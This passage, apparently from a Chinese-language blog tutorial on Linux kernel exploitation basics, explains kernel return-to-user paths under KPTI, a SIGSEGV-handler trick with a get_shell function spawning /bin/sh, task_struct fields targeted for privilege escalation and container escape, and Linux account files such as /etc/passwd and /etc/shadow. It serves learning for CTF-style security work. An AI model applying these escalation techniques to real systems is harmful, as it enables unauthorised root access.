<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span>   <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span> + <span class="number">0x28</span>]	/* <span class="built_in">RSP</span> */</span><br><span class="line"><span class="keyword">push</span>   <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>]			/* <span class="built_in">RDI</span> */</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">rdi</span>, <span class="built_in">cr3</span></span><br><span class="line"><span class="keyword">or</span>     <span class="built_in">rdi</span>,<span class="number">0x1000</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">cr3</span>, <span class="built_in">rdi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pop</span>    <span class="built_in">rdi</span></span><br><span class="line"><span class="keyword">pop</span>    <span class="built_in">rsp</span></span><br></pre></td></tr></table></figure></div>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>关闭 KPTI 后由于内核代码会被动态补丁（patch）修改，导致页表切换代码（<code>SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</code>）被跳过。</p>

    </div>
  </div>

</li>
<li><p><strong>恢复 gs 寄存器并返回。</strong></p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">USERGS_SYSRET64	<span class="comment">; 实际汇编为：swapgs; sysretq</span></span><br></pre></td></tr></table></figure></div></li>
</ol>
<h5 id="慢速返回路径：swapgs-restore-regs-and-return-to-usermode"><a href="#慢速返回路径：swapgs-restore-regs-and-return-to-usermode" class="headerlink" title="慢速返回路径：swapgs_restore_regs_and_return_to_usermode"></a>慢速返回路径：swapgs_restore_regs_and_return_to_usermode</h5><ol>
<li><p><strong>从栈上恢复通用寄存器。</strong><code>pop_rdi=0</code> 表示 <code>rdi</code> 寄存器不恢复，因为 <code>RDI</code> 在后续的栈切换过程中被用作临时寄存器。</p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POP_REGS pop_rdi=<span class="number">0</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>保存旧栈指针并切换到跳板栈。</strong></p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">movq</span>	%rsp, %rdi</span><br><span class="line"><span class="keyword">movq</span>	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>复制 IRET 帧到跳板栈。</strong></p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pushq	<span class="number">6</span>*<span class="number">8</span>(%rdi)	/* <span class="built_in">SS</span> */</span><br><span class="line">pushq	<span class="number">5</span>*<span class="number">8</span>(%rdi)	/* <span class="built_in">RSP</span> */</span><br><span class="line">pushq	<span class="number">4</span>*<span class="number">8</span>(%rdi)	/* EFLAGS */</span><br><span class="line">pushq	<span class="number">3</span>*<span class="number">8</span>(%rdi)	/* <span class="built_in">CS</span> */</span><br><span class="line">pushq	<span class="number">2</span>*<span class="number">8</span>(%rdi)	/* <span class="built_in">RIP</span> */</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>切换到用户页表。</strong>在这之前需要先将 <code>rdi</code> 保存到跳板栈中，因为这 <code>rdi</code> 寄存器在切换页表时会用到。</p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/* <span class="keyword">Push</span> user <span class="built_in">RDI</span> on the trampoline stack. */</span><br><span class="line">pushq	(%rdi)</span><br><span class="line">   </span><br><span class="line">SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line">   </span><br><span class="line">/* Restore <span class="built_in">RDI</span>. */</span><br><span class="line">popq	%rdi</span><br></pre></td></tr></table></figure></div>

<p>对应的汇编代码为：</p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span>   <span class="built_in">rdi</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">rdi</span>, <span class="built_in">cr3</span></span><br><span class="line"><span class="keyword">or</span>     <span class="built_in">rdi</span>,<span class="number">0x1000</span></span><br><span class="line"><span class="keyword">pop</span>    <span class="built_in">rdi</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>关闭 KPTI 后由于内核代码会被动态补丁（patch）修改，导致页表切换代码（<code>SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</code>）被跳过。</p>

    </div>
  </div>
</li>
<li><p><strong>恢复 gs 寄存器并返回。</strong></p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SWAPGS</span>	<span class="comment">; swapgs</span></span><br><span class="line">INTERRUPT_RETURN	<span class="comment">; iretq</span></span><br></pre></td></tr></table></figure></div></li>
</ol>
<h3 id="kernel-pwn-如何返回用户态"><a href="#kernel-pwn-如何返回用户态" class="headerlink" title="kernel pwn 如何返回用户态"></a>kernel pwn 如何返回用户态</h3><h4 id="iretq-SIGSEGV"><a href="#iretq-SIGSEGV" class="headerlink" title="iretq + SIGSEGV"></a>iretq + SIGSEGV</h4><p>这种方式需要我们寻找一个 <code>swapgs; iretq;</code> 的 gadget 来返回用户空间。另外还要根据 <code>iretq;</code> 指令的需求设置栈顶为 <code>trap_frame</code> 结构来表示返回用户空间后的状态。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> user_rip;</span><br><span class="line">    <span class="type">size_t</span> user_cs;</span><br><span class="line">    <span class="type">size_t</span> user_rflags;</span><br><span class="line">    <span class="type">size_t</span> user_sp;</span><br><span class="line">    <span class="type">size_t</span> user_ss;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure></div>

<p>对于开启 KPTI 保护的内核来说，这种方式缺少页表切换操作，导致返回到用户态后用户态代码没有执行权限造成异常。</p>
<p>一种方法是把 <code>get_shell</code> 函数注册为 <code>SIGSEGV</code> 信号处理函数，然后再用 swapgs + iretq 的方式返回。当出现异常时会跳转到 <code>get_shell</code> 函数继续执行，这样就完成了用户态的返回。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signal(SIGSEGV, (<span class="type">void</span> (*)(<span class="type">int</span>)) get_shell);</span><br></pre></td></tr></table></figure></div>

<p>上面这段代码本质就是在程序的段错误信号注册了一个 <code>get_shell</code> 回调函数。开启 KPIT 后  swapgs + iretq 的方式返回位切换页表，执行用户空间代码触发段错误回调 <code>get_shell</code> 函数。而回调 <code>get_shell</code> 函数前也会有系统态到用户态的切换，此时完成了页表和栈的正确切换（栈 0x10 对齐），确保执行 <code>get_shell</code> 函数不会出问题。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    signal(SIGSEGV, (<span class="type">void</span> (*)(<span class="type">int</span>)) get_shell);</span><br><span class="line">    *(<span class="type">size_t</span> *) <span class="number">0x114514</span> = <span class="number">0x1919810</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="swapgs-restore-regs-and-return-to-usermode"><a href="#swapgs-restore-regs-and-return-to-usermode" class="headerlink" title="swapgs_restore_regs_and_return_to_usermode"></a>swapgs_restore_regs_and_return_to_usermode</h4><p>根据我们对 <code>swapgs_restore_regs_and_return_to_usermode</code> 函数的分析，忽略掉前面恢复通用寄存器以及切换到跳板栈的操作后，该函数等价于如下代码：</p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>		<span class="built_in">rdi</span>, <span class="built_in">cr3</span></span><br><span class="line"><span class="keyword">or</span>		<span class="built_in">rdi</span>, <span class="number">0x1000</span></span><br><span class="line"><span class="keyword">mov</span>		<span class="built_in">cr3</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="keyword">pop</span>		<span class="built_in">rax</span>	<span class="comment">; 根据实际情况，有的内核不需要</span></span><br><span class="line"><span class="keyword">pop</span> 	<span class="built_in">rdi</span></span><br><span class="line"><span class="keyword">swapgs</span></span><br><span class="line"><span class="keyword">iretq</span></span><br></pre></td></tr></table></figure></div>

<p>因此我们只需要跳转到该函数恢复通用寄存器之后的代码处，并且在栈上依次设置 <code>rax</code>（如果有）、<code>rdi</code> 和 <code>trap_frame</code> 结构就可以实现页表切换+返回用户态。</p>
<p>并且对于关闭 KPTI 的情况，内核代码会被动态修改，也就是说该函数中切换页表的操作会被跳过，因此这个方法也可以完美兼容 KPTI 关闭的情况。</p>
<h1 id="进程核心结构体-task-struct"><a href="#进程核心结构体-task-struct" class="headerlink" title="进程核心结构体 task_struct"></a>进程核心结构体 task_struct</h1><p>在 Linux 操作系统中，<code>task_struct</code> 是一个关键的数据结构，用于表示进程的状态。每个进程在 Linux 内核中都有一个 <code>task_struct</code> 结构体实例，它包含了关于该进程的所有信息，如进程状态、堆栈、调度信息、打开的文件、信号状态等。<code>task_struct</code> 结构体定义在 <code>&lt;linux/sched.h&gt;</code> 头文件中。</p>
<p>其中在 kernel pwn 中用到的关键字段如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/task_struct.drawio.svg"
                      alt="task_struct.drawio"
                ></p>
<ul>
<li><p><code>void* stack</code>：这个字段指向进程的内核栈的栈顶。在 kernel pwn 中我们可以通过这个字段获取到内核栈地址，从而向内核栈喷射 ROP 实现提权。</p>
</li>
<li><p><code>struct list_head tasks</code>：该字段是一个链表节点，用于将当前进程结构体链接到全局的进程链表中。这使得内核能够遍历所有进程。</p>
<p>在 kernel pwn 中我们从全局变量 <code>init_task</code> 开始通过 <code>tasks.prev</code> 遍历 <code>task_struct</code> 来寻找 exp 进程对应的 <code>task_struct</code>。</p>
<p>由于新创建的进程是从 <code>init_task.tasks.prev</code> 插入的，因此按照 <code>prev</code> 方向遍历可以更快的找到我们的进程。</p>
<blockquote>
<p>在 Linux 操作系统中，<code>init_task</code> 是一个非常关键的结构，它是所有进程的祖先。<code>init_task</code> 定义了系统中第一个进程，即进程号为 0 的 <code>swapper</code> 或 <code>idle</code> 进程。这个进程在系统启动时被创建，并作为所有后续进程的根基。它不执行任何实际的应用级任务，而是主要负责系统的调度和管理任务。</p>
<p><code>init_task</code> 在 Linux 内核源代码中通常是以宏的形式静态定义（ 位于 <code>linux/init_task.h</code>）的。</p>
</blockquote>
</li>
<li><p><code>struct mm_struct mm</code>：指向 <code>mm_struct</code> 结构的指针，该结构包含进程的内存管理信息。</p>
<ul>
<li><code>pgd_t pgd</code>：指向该进程页全局目录（Page Global Directory）的指针（<strong>注意这是线性映射区的地址而不是物理地址</strong>），是虚拟内存地址转换中最顶层的页表。在 kernel pwn 中我们借助这个找到 PGD，进而可以解析页表实现虚拟地址到物理地址的转换。</li>
</ul>
</li>
<li><p><code>pid_t pid</code>：进程的唯一标识符，即进程ID。在 kernel pwn 中我们可以通过这个字段判断 <code>task_struct</code> 是否对应自身进程。</p>
</li>
<li><p><code>struct list_head ptraced</code>：一个链表头，用于链接所有跟踪（或被该进程跟踪）的进程。在没有进程附加的时候这个字段是是空链表指向自己（注意不是指向 <code>task_struct</code> 起始地址)。因此在 kernel pwn 中如果我们有物理地址上的任意地址读，那么如果我们扫描物理内存找到自身进程对应的 <code>task_struct</code>，就可以根据这个字段计算出 <code>task_struct</code> 的地址（线性映射区的地址），结合物理地址上的偏移进而可以得到线性映射区的起始地址 <code>page_offset_base</code>。</p>
</li>
<li><p><code>const struct cred __rcu *cred</code>：指向进程的凭证结构的指针，包括 UID、GID 和其他安全相关信息。在 kernel pwn 中我们的目的就是想办法让该字段字段指向的 <code>cred</code> 对应的权限变成 root 权限。直接针对这个字段的操作有两种：</p>
<ul>
<li><p>修改 <code>cred</code> 指针，使其指向 <code>init_cred</code>。</p>
<blockquote>
<p><code>init_cred</code> 主要用于定义系统启动时进程的默认安全属性。在 Linux 操作系统中，<code>init_cred</code> 为系统初始化进程（如 init 或 systemd）提供初始的用户和组标识符，通常是 root 用户（UID 0）和 root 组（GID 0）。这允许系统初始化进程以最高权限运行，从而完成系统启动和配置任务。</p>
</blockquote>
</li>
<li><p>修改 <code>cred</code> 指针指向的 <code>cred</code> 结构体的内容，使得其中的 <code>uid</code>、<code>gid</code> 等字段变为 0。</p>
</li>
</ul>
</li>
<li><p><code>char comm[TASK_COMM_LEN]</code>：进程的命令名，通常是启动进程的可执行文件名，这个字段的最大长度为 16 字节。在 kernel pwn 中，如果我们有无限次任意地址读的能力，那么我们通常使用如下代码修改这个字段，然后在内存中搜索这个字符串来定位自身进程对应的 <code>task_struct</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;sky123123123123&quot;</span>);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>struct fs_struct *fs</code>：指向文件系统相关结构的指针，包括文件描述符表、根目录、当前工作目录等信息。在 kernel pwn 中，我们会将这个字段修改指向 <code>init_fs</code> 来实现 docker 逃逸。因为 <code>init_fs</code> 是系统初始化时使用的全局 <code>fs_struct</code> 实例，如果某进程的 <code>fs_struct</code> 被修改为 <code>init_fs</code>，理论上这个进程将会获得对整个宿主机文件系统的访问能力，而不再受到容器文件系统命名空间的限制，即导致容器逃逸。</p>
</li>
</ul>
<h1 id="Linux-权限管理"><a href="#Linux-权限管理" class="headerlink" title="Linux 权限管理"></a>Linux 权限管理</h1><h2 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h2>
  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>为了方便记录，用户权限和文件权限分开写了，但是用户权限部分内容依赖文件权限 <strong>SUID (Set User ID)</strong> 相关内容，需要先在文件权限部分作了解。</p>

    </div>
  </div>

<h3 id="用户权限表示"><a href="#用户权限表示" class="headerlink" title="用户权限表示"></a>用户权限表示</h3><ul>
<li><strong>UID（User ID）</strong>：每个用户在 Linux 系统中的唯一标识符。超级用户（root）的 UID 为 0，普通用户的 UID 通常大于 1000。</li>
<li><strong>GID（Group ID）</strong>：用户<strong>主组</strong> ID，GID 指定了用户默认属于哪个组。</li>
<li><strong>Groups</strong>：<ul>
<li><strong>主组</strong>：每个用户都有一个主组，通常在创建用户时分配，与用户同名。主组的 GID 用于标记用户创建的文件和目录。</li>
<li><strong>辅助组</strong>：用户可以属于多个辅助组，辅助组提供额外的权限，允许用户访问和修改多个资源。通过 <code>id</code> 命令可以查看用户所属的所有组。</li>
</ul>
</li>
</ul>
<p>例如下面的示例：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/ ~ <span class="built_in">id</span></span><br><span class="line">uid=1000(sky123) gid=1000(sky123) <span class="built_in">groups</span>=1000(sky123),27(<span class="built_in">sudo</span>),1001(developers)</span><br><span class="line">/ ~ su</span><br><span class="line">/ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>用户 <code>sky123</code> 的 UID 为 1000，主组 GID 为 1000（<code>sky123</code>），另外还属于 <code>sudo</code> 和 <code>developers</code> 两个组。其中辅助组 <code>sudo</code> 赋予了该用户执行 <code>sudo</code> 命令的权限。</li>
<li>切换为 <code>root</code> 用户后仅属于 <code>root</code> 组。</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <ul>
<li>Linux 系统中的 root 用户的用户 ID（UID）是 0。这个 UID 是为系统的超级用户或管理员保留的，它赋予用户对系统的完全控制权，可以无视任何权限限制（因为本身就可以修改权限配置）。</li>
<li>如果一个用户不是 root 用户但是在 root 组（GID 为 0）那么虽然这个用户没有管理员权限，但是对于文件有额外的 root 所属组的权限。这时候就有可能通过修改属于管理员组的文件实现提权。</li>
</ul>

    </div>
  </div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>一些定制的操作系统会有一些内核层面的安全保护可以限制 root 权限用户的行为。</p>

    </div>
  </div>

<h3 id="相关配置文件"><a href="#相关配置文件" class="headerlink" title="相关配置文件"></a>相关配置文件</h3><h4 id="账户信息（-etc-passwd）"><a href="#账户信息（-etc-passwd）" class="headerlink" title="账户信息（&#x2F;etc&#x2F;passwd）"></a>账户信息（&#x2F;etc&#x2F;passwd）</h4><p><code>/etc/passwd</code> 存储用户账号信息，包含用户名、UID、GID、主目录和登录 Shell。</p>
<p>例如：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sky123:x:1000:1000:Sky User,,,:/home/sky123:/bin/bash</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>sky123</code>：用户名。</li>
<li><code>x</code>：加密密码的占位符（实际存储在 <code>/etc/shadow</code> 中）。</li>
<li><code>1000</code>：用户的 UID。</li>
<li><code>1000</code>：用户的主组 GID。</li>
<li><code>Sky User,,,</code>：用户的描述信息，可以存储用户的全名、联系信息等。</li>
<li><code>/home/sky123</code>：用户的主目录。</li>
<li><code>/bin/bash</code>：用户登录后使用的 Shell。</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>如果我们有编辑 <code>/etc/passwd</code> 的权限，那么可以通过修改 <code>uid</code> 为 0 来使自身变为 root 权限。不过这个文件通常只有 root 权限的用户才能编辑。</p>

    </div>
  </div>

<h4 id="组信息（-etc-group）"><a href="#组信息（-etc-group）" class="headerlink" title="组信息（&#x2F;etc&#x2F;group）"></a>组信息（&#x2F;etc&#x2F;group）</h4><p><code>/etc/group</code> 存储系统中所有组的信息，包括组名、GID 和组内用户列表。</p>
<p>例如：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo:x:27:sky123</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>sudo</code>：组名。</li>
<li><code>x</code>：密码占位符。</li>
<li><code>27</code>：GID。</li>
<li><code>sky123</code>：该组内的用户。</li>
</ul>
<h4 id="密码相关（-etc-shadow）"><a href="#密码相关（-etc-shadow）" class="headerlink" title="密码相关（&#x2F;etc&#x2F;shadow）"></a>密码相关（&#x2F;etc&#x2F;shadow）</h4><p><code>/etc/shadow</code> 存储用户的加密密码及密码相关的安全信息，只有 <code>root</code> 用户可以访问。</p>
<p>通常该文件中的条目格式如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:$id$salt$hash:lastchg:min:max:warn:inactive:expire:reserved</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><strong><code>username</code>（用户名）</strong>：表示与此密码条目关联的用户名。必须与 <code>/etc/passwd</code> 中的用户名一致。</p>
</li>
<li><p><strong><code>$id$salt$hash</code>（加密密码信息）</strong>：存储加密后的密码。这个字段分为几个部分，通过 <code>$</code> 分隔：</p>
<ul>
<li><strong><code>id</code></strong> ：标识使用的密码哈希算法。</li>
<li><strong><code>salt</code></strong> ：随机生成的盐值，用于增加密码的随机性。</li>
<li><strong><code>hash</code></strong> ：最终的加密密码，基于用户输入密码和盐值计算得出。</li>
</ul>
<p> <strong>特殊情况</strong>：</p>
<ul>
<li>如果是 <code>x</code>，表示加密密码存储在 <code>/etc/passwd</code>（历史遗留方式）。</li>
<li>如果是 <code>*</code>，表示用户密码被禁用。</li>
<li>如果是 <code>!</code>，表示用户账户被禁用。</li>
<li>如果是 <code>!!</code>，表示尚未设置密码。</li>
<li>如果为空（<code>:</code>），表示无需密码即可登录（危险，尽量避免）。</li>
</ul>
</li>
<li><p><strong><code>lastchg</code>（上次修改密码的日期）</strong>：用户密码上次修改的日期。表示自 1970 年 1 月 1 日以来的天数。</p>
</li>
<li><p><strong><code>min</code>（最小修改间隔）</strong>：两次密码修改之间的最小天数，防止用户过于频繁地更改密码。</p>
</li>
<li><p><strong><code>max</code>（最大密码有效期）</strong>密码的最大有效期，超过这个期限，用户将被要求修改密码。</p>
</li>
<li><p><strong><code>warn</code>（密码过期警告时间）</strong>：密码过期前，系统开始向用户发出警告的天数。</p>
</li>
<li><p><strong><code>inactive</code>（密码过期后的宽限时间）</strong>：密码过期后，用户仍然可以登录的宽限天数。超过宽限时间后，账户将被锁定，无法登录。</p>
</li>
<li><p><strong><code>expire</code>（账户过期时间）</strong>：如果设置了这个字段，到期后用户将无法登录。</p>
</li>
<li><p><strong><code>reserved</code>（保留字段）</strong>：当前未使用，通常为空。</p>
</li>
</ul>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>现代 Linux 系统中 root 用户对应在 <code>/etc/shadow</code> 中的典型设置为：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:*:19683:0:99999:7:::</span><br></pre></td></tr></table></figure></div>

<p>这种配置表示 <strong>root 用户的密码被禁用，无法通过密码直接登录</strong>。</p>

    </div>
  </div>


<h4 id="工具相关（-etc-sudoers，-etc-sudoers-d-）"><a href="#工具相关（-etc-sudoers，-etc-sudoers-d-）" class="headerlink" title="工具相关（&#x2F;etc&#x2F;sudoers，&#x2F;etc&#x2F;sudoers.d&#x2F;）"></a>工具相关（&#x2F;etc&#x2F;sudoers，&#x2F;etc&#x2F;sudoers.d&#x2F;）</h4><p><code>sudo</code> 命令，以及如何使用 <code>sudo</code>。建议使用 <code>visudo</code> 工具进行编辑，以确保文件的正确性。</p>
<ul>
<li>示例条目：<code>sky123 ALL=(ALL) ALL</code></li>
<li>解释：允许 <code>sky123</code> 用户在所有主机上以所有用户身份执行所有命令。</li>
</ul>
<h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h3><h4 id="查看用户和组信息"><a href="#查看用户和组信息" class="headerlink" title="查看用户和组信息"></a>查看用户和组信息</h4><ul>
<li><strong>查看用户ID和组</strong>：<code>id username</code><ul>
<li>显示指定用户的 UID、主组GID 及其所属的所有组。</li>
</ul>
</li>
<li><strong>查看用户组</strong>：<code>groups username</code><ul>
<li>列出用户所属的所有组，包括主组和辅助组。</li>
</ul>
</li>
<li><strong>显示当前用户名</strong>：<code>whoami</code><ul>
<li>显示当前登录用户的用户名。</li>
</ul>
</li>
</ul>
<h4 id="更改权限"><a href="#更改权限" class="headerlink" title="更改权限"></a>更改权限</h4><ul>
<li><p><strong>临时更改权限</strong>：<code>sudo command</code></p>
<p><code>sudo</code>（superuser do）允许普通用户以其他用户的安全权限，通常是超级用户（root），执行命令。<code>sudo</code> 为系统管理员提供了一种给予普通用户部分管理员权限的方法。</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <ul>
<li><p>我们使用 <code>sudo command</code> 执行 root 权限命令时要求输入的是<strong>当前用户的密码</strong>，而不是 root 用户的密码。</p>
</li>
<li><p>并不是所有用户都可以使用 <code>sudo command</code> 执行 root 权限命令，只有在 <code>/etc/sudoers</code> 文件或相关配置中明确允许的用户才能使用 <code>sudo</code>。可以通过 <code>sudo -l</code> 检查当前用户是否有 <code>sudo</code> 权限</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ ~ <span class="built_in">sudo</span> -l</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> sky123:</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> sky123 on sky123:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User sky123 may run the following commands on sky123:</span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>sudo</code> 命令具有<strong>密码缓存机制</strong>，</p>
<ul>
<li>当你在一个新的终端或 Shell 会话中首次使用 <code>sudo</code> 命令时，<code>sudo</code> 会提示你输入密码。它通过密码验证来确认你是当前用户，并且你有权限使用 <code>sudo</code>。</li>
<li>输入密码后，<code>sudo</code> 会将这个验证状态缓存一段时间，默认情况下是 <strong>15 分钟</strong>。如果你在缓存有效期内再次运行 <code>sudo</code> 命令，无需再次输入密码。</li>
<li><code>sudo</code> 使用 <strong>时间戳文件</strong> 来记录密码验证状态。默认情况下，这些文件存储在 <code>/run/sudo/ts</code> 目录中。可以使用 <code>sudo -k</code> 清除缓存状态。</li>
<li>linux 中每个 shell 会话会有独立的 <code>sudo</code> 会话状态。新开的 shell 或终端没有继承之前终端的 <code>sudo</code> 缓存，因此即使是同一用户也需要重新输入密码来进行验证。</li>
</ul>
</li>
</ul>

    </div>
  </div>
</li>
<li><p><strong>切换用户</strong>：<code>su [- username]</code></p>
<p><code>su</code>（substitute user或switch user）命令允许用户切换当前登录会话的用户身份。默认情况下，没有参数的 <code>su</code> 会尝试切换到超级用户（root）。</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <ul>
<li><p><code>su</code> 如果切换的目标用户需要输入<strong>目标用户</strong>的密码，<strong>除非当前用户是 root 用户</strong>。</p>
</li>
